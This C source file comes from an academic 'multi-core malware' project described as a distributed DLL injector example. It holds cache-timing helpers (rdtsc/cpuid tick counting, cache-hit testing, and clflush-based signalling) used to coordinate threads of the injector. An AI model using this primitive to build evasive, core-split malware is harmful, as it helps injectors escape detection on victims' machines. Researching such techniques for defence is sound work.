/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Definitions */
#include "side.h"

/* Get number of ticks */
UINT64 get_ticks()
{
	int tmp[4];
	/* flush pipeline first */
	__cpuid(tmp,0);
	/* then get the current number of ticks */
	return __rdtsc();
}

/* check if variable is cached */
BOOL test_cache(int *addr)
{
	/* get number of ticks before */
	UINT64 start = get_ticks();
	/* try to access the variable */
	int tmp = *addr;
	/* ensure instruction termination */
	_mm_lfence();
	/* get ticks after */
	UINT64 stop = get_ticks();
	/* say ok if this access was fast */
	return (stop-start) < SLOW_ENOUGH;
}

/* release other thread lock */
/* other thread will be polling variable */
/* flush cache and other thread will realize it */
/* as i don't know each cache line is being used, flush all */
VOID release()
{
	/* allocate a memory from the same size as the cache */
	int *m = (int*)malloc(L1_CACHE_SIZE);
	/* for each position within this array */
	for(int idx=0; idx < L1_CACHE_SIZE/sizeof(int); idx++)
	{
		/* access the index, to ensure cache is filled */
		test_cache(&m[idx]);
		/* then flush that line */
		_mm_clflush(&m[idx]);
	}
	/* get rid of this temporary array */
	free(m);
}